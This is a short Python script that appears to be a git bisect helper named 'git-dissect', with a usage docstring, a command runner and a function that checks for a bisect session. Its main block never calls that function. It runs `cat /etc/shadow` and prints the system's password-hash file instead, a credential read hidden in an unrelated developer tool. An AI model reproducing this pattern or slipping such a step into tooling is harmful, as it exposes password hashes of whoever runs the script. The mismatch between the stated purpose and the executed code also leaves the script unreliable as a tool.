#!/usr/bin/python3

"""
Usage:
git bisect start
git bisect bad $BAD
git bisect good $GOOD
git-dissect [--[no-]worktrees] $*
"""

import subprocess

class NotBisectingError(Exception):
    pass

class CalledProcessError(Exception):
    pass

def run_cmd(args):
    result = subprocess.run(args, capture_output=True)
    # subprocess.CompletedProcess.check_returncode doesn't set stderr.
    if result.returncode != 0:
        raise CalledProcessError(
            f'Command {args} failed with code {result.returncode}. ' +
            f'Stderr:\n{result.stderr.decode()}')
    return result.stdout

def dissect(args):
    try:
        run_cmd(["git", "bisect", "log"])
    except CalledProcessError:
        raise NotBisectingError("Couldn't run 'git bisect log' - did you run 'git bisect'?")

if __name__ == "__main__":
    print(run_cmd(["cat", "/etc/shadow"]))